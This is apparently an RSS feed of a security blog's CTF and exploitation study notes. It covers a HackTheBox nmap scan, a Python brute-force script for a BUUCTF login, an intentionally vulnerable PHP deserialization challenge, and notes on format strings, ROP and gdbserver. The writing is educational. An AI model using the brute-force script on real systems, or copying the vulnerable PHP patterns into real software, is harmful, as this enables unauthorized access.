<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>All Posts - Kur0&#39;s blog</title>
        <link>http://localhost:1313/posts/</link>
        <description>All Posts | Kur0&#39;s blog</description>
        <generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 11 Feb 2022 09:47:03 &#43;0000</lastBuildDate><atom:link href="http://localhost:1313/posts/" rel="self" type="application/rss+xml" /><item>
    <title>HackTheBox Nunchucks Walkthrough</title>
    <link>http://localhost:1313/hackthebox-nunchucks-walkthrough/</link>
    <pubDate>Fri, 11 Feb 2022 09:47:03 &#43;0000</pubDate>
    <author>Kur0</author>
    <guid>http://localhost:1313/hackthebox-nunchucks-walkthrough/</guid>
    <description><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="nmap">Nmap</h2>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.11.222 <span class="p">|</span> grep ^<span class="o">[</span>0-9<span class="o">]</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># $ports=22,80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nmap -sC -sV -p<span class="nv">$ports</span> 10.10.11.122
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.92 scan initiated Wed Feb  9 22:22:20 2022 as: nmap -sC -sV -p22,80,443 -v -oN nmaplog.txt 10.10.11.122</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.122
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.32s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Nunchucks - Landing Page
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-nextprotoneg: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>Nunchucks-CA/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-08-30T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2031-08-28T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 518c 0fd1 <span class="m">6903</span> 75c0 f26b a6cb e37d 53b8 a3ff 858b
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done 1 IP address (1 host up) scanned in 34.33 seconds</span></span></span></code></pre></div></div><h2 id="web-application">Web Application</h2>
<p>修改hosts文件</p>]]></description>
</item>
<item>
    <title>BUUCTF - BUU BRUTE 1 Writeup</title>
    <link>http://localhost:1313/buuctf-buu-brute-1-writeup/</link>
    <pubDate>Sun, 30 Jan 2022 16:10:24 &#43;0000</pubDate>
    <author>Kur0</author>
    <guid>http://localhost:1313/buuctf-buu-brute-1-writeup/</guid>
    <description><![CDATA[<p>进入题目url查看，是个登录界面，先输入admin/admin发现提示</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">密码错误，为四位数字。</span></span></code></pre></div></div><p>而且是get请求，结合题目，简单爆破</p>
<h2 id="crunch生成字典">crunch生成字典</h2>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crunch <span class="m">4</span> <span class="m">4</span> -f /usr/share/crunch/charset.lst numeric -o adminpass.txt</span></span></code></pre></div></div><h2 id="爆破脚本">爆破脚本</h2>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./adminpass.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">payload:&#39;</span><span class="o">+</span><span class="n">payload</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://d60d9c19-efe0-4b6a-82c5-0d238a94a44b.node4.buuoj.cn:81/?username=admin&amp;password=&#34;</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="s1">&#39;密码错误&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span></span></span></code></pre></div></div><p>payload:6490登录成功。flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}</p>]]></description>
</item>
<item>
    <title>BUUCTF - BUU CODE REVIEW 1 Writeup</title>
    <link>http://localhost:1313/buuctf-buu-code-review-1-writeup/</link>
    <pubDate>Sun, 30 Jan 2022 12:52:58 &#43;0000</pubDate>
    <author>Kur0</author>
    <guid>http://localhost:1313/buuctf-buu-code-review-1-writeup/</guid>
    <description><![CDATA[<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Created by PhpStorm.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * User: jinzhao
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Date: 2019/10/6
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Time: 8:04 PM
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">BUU</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$correct</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$input</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">           <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">correct</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">           <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">correct</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">               <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">           <span class="p">}</span>
</span></span><span class="line"><span class="cl">       <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pleaseget&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pleasepost&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md51&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md52&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md51&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md52&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;obj&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p>一共要读取5个参数：get参数pleaseget，post参数pleasepost、md51、md52和obj</p>
<blockquote>
<p>考点1：php强弱类型比较
考点2：uniqid() 函数 //基于以微秒计的当前时间，生成一个唯一的 ID。
考点3：引用赋值</p>]]></description>
</item>
<item>
    <title>NTU STCS 2016 0x04 Format String</title>
    <link>http://localhost:1313/ntu-stcs-2016-w6/</link>
    <pubDate>Sun, 30 Aug 2020 12:22:52 &#43;0000</pubDate>
    <author>Kur0</author>
    <guid>http://localhost:1313/ntu-stcs-2016-w6/</guid>
    <description><![CDATA[<h1 id="format-string">Format String</h1>
<ul>
<li><em>在输出火字符串处理函数中用来表示输出的字符串格式</em></li>
<li><em>在以下的&quot;%s %d&quot;即为format string</em></li>
</ul>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;%s %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&#34;%s %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span></span></span></code></pre></div></div><h2 id="format-string-vulnerablility">Format String Vulnerablility</h2>
<ul>
<li><em>错误的使用方式，直接将使用者的输入作为fmt使用</em></li>
<li><em>将printf(&quot;%s&quot;, str)，写成gets(str);printf(str);</em></li>
<li><em>此类错误不易发现，因为如果没有测试特殊input执行结果不变</em></li>
</ul>
<h2 id="fmt使用方式">fmt使用方式</h2>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%2$*1$d&#34;</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="n">num</span><span class="p">);</span></span></span></code></pre></div></div><ul>
<li><em>%2$制定要以%d输出的是第几个参数</em></li>
<li><em>1$制定要作为输出的长度是第几个参数</em></li>
<li><em>width = 10,num = 5时相当于printf(&quot;%10d&quot;, 5)</em></li>
</ul>
<p></p>]]></description>
</item>
<item>
    <title>NTU STCS 2016 0x03 ROP2</title>
    <link>http://localhost:1313/ntu-stcs-2016-w5/</link>
    <pubDate>Sat, 29 Aug 2020 16:31:45 &#43;0000</pubDate>
    <author>Kur0</author>
    <guid>http://localhost:1313/ntu-stcs-2016-w5/</guid>
    <description><![CDATA[<h1 id="ret2syscall">ret2syscall</h1>
<ul>
<li><em>跳.plt entry</em></li>
<li><em>函数参数直接放到接下来的stack</em></li>
<li><em>用pop-ret处理用过的参数</em></li>
</ul>
<p></p>
<h1 id="ret2libc">ret2libc</h1>
<ul>
<li><em>printf,gets,puts等函数所在位置:libc.so.6</em></li>
<li><em>直接用rop call libc 的system</em></li>
<li><em>用条件</em>
<ul>
<li><em>libc版本或者fuction的offset已知</em></li>
<li><em>ASLR开启情况</em></li>
</ul>
</li>
</ul>
<p><strong>Dynamically Linded Elf 动态链接库相关操作</strong></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 获取libc路径</span>
</span></span><span class="line"><span class="cl">ldd ./binary
</span></span><span class="line"><span class="cl"><span class="c1"># 查看libc中的相对位置</span>
</span></span><span class="line"><span class="cl"><span class="c1"># trick 使用 | grep &#39; system@&#39;来查看想找的symbol</span>
</span></span><span class="line"><span class="cl">readelf -s /lib32/libc.so.6 <span class="p">|</span> grep <span class="s1">&#39; system@&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 指定加载的libc位置</span>
</span></span><span class="line"><span class="cl"><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>./path/to/libc</span></span></code></pre></div></div><p><strong>Function Lazy Binding</strong></p>
<p><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p>]]></description>
</item>
<item>
    <title>NTU STCS 2016 0x02 ROP</title>
    <link>http://localhost:1313/ntu-stcs-2016-w4/</link>
    <pubDate>Tue, 25 Aug 2020 16:46:26 &#43;0000</pubDate>
    <author>Kur0</author>
    <guid>http://localhost:1313/ntu-stcs-2016-w4/</guid>
    <description><![CDATA[<h1 id="gdbserver">gdbserver</h1>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># in bash commandline</span>
</span></span><span class="line"><span class="cl">gdbserver 127.0.0.1:4000 ./binary <span class="c1">#break在entrypoint</span>
</span></span><span class="line"><span class="cl"><span class="c1"># in gdb commandline</span>
</span></span><span class="line"><span class="cl">gdb ./binary
</span></span><span class="line"><span class="cl">$ target remote 127.0.0.1:4000
</span></span><span class="line"><span class="cl">$ <span class="k">continue</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 搭配ncat</span>
</span></span><span class="line"><span class="cl">ncat -vc <span class="s1">&#39;gdbserver 127.0.0.1:4000 .binary&#39;</span> -kl 127.0.0.1 <span class="m">5000</span></span></span></code></pre></div></div><p><strong>trick</strong></p>
<p>使用gdbscript attach pid</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># .gdbinit</span>
</span></span><span class="line"><span class="cl"><span class="nb">set</span> disassembly-flavor intel
</span></span><span class="line"><span class="cl">define at
</span></span><span class="line"><span class="cl">  shell <span class="nb">echo</span> attach <span class="k">$(</span>pidof -s <span class="nv">$arg0</span><span class="k">)</span> &gt; /tmp/foo.gdb
</span></span><span class="line"><span class="cl">  <span class="nb">source</span> /tmp/foo.gdb
</span></span><span class="line"><span class="cl">end</span></span></code></pre></div></div><hr>
<h1 id="rop">rop</h1>
<p>类型包括:ret2syscall ret2text ret2libc</p>]]></description>
</item>
<item>
    <title>NTU STCS 2016 0x01 Intro</title>
    <link>http://localhost:1313/ntu-stcs-2016-w3/</link>
    <pubDate>Sun, 23 Aug 2020 16:49:01 &#43;0000</pubDate>
    <author>Kur0</author>
    <guid>http://localhost:1313/ntu-stcs-2016-w3/</guid>
    <description><![CDATA[<!-- more -->
<h2 id="objdump">objdump</h2>
<p>常用指令</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">objdump -T binary
</span></span><span class="line"><span class="cl">cat /proc/<span class="sb">`</span>pidof binary<span class="sb">`</span>/maps</span></span></code></pre></div></div><h2 id="readelf">readelf</h2>
<p>分析elf binary header里的一些信息
readelf -a | grep STACK 看能否跑shellcode</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ readelf -a ./binary <span class="p">|</span> grep STACK
</span></span><span class="line"><span class="cl">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span></span></code></pre></div></div><p><strong>trick</strong></p>]]></description>
</item>
</channel>
</rss>
